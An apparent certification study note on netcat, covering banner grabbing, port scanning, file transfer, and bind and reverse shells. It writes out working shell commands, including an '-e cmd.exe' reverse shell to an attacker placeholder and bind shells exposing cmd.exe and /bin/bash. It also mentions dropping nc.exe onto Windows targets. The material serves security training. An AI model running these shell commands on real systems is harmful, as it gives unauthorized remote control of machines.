---
title: "Netcat: the TCP/IP swiss-army knife"
description: "Banner grabbing, port scanning, file transfer, and bind/reverse shells."
pubDate: 2026-11-11
category: "Cybersecurity"
source: "INE Certification"
lang: "bash"
tags: ["netcat", "shells"]
draft: false
---

Netcat reads and writes raw TCP/UDP connections making it able to perform banner grabbing, quick port checks, moving files and handle both ends of a bind or reverse shell.

```bash
# Connect / banner grab
nc <target_ip> <port>

# Listener
nc -nvlp <port>            # n=no DNS, v=verbose, l=listen, p=port

# File transfer
nc -nvlp <port> > received_file      # receiver
nc -nv <ip> <port> < file_to_send    # sender

# Bind shell (listener runs ON the target)
nc -nvlp <port> -e cmd.exe           # Windows target
nc -nvlp <port> -c /bin/bash         # Linux target (-c is the Linux-only equivalent of -e)

# Reverse shell (attacker listens, target connects out)
nc -nv <attacker_ip> <port> -e cmd.exe
```

`-z` turns netcat into a bare-bones port scanner (`nc -zv <target> <port-range>`). Kali keeps a portable `nc.exe` under `/usr/share/windows-binaries` for when you need to drop it onto a Windows target. `-e`/`-c` are the options that make bind/reverse shells possible, so treat any box with an exec-capable netcat installed as a soft target.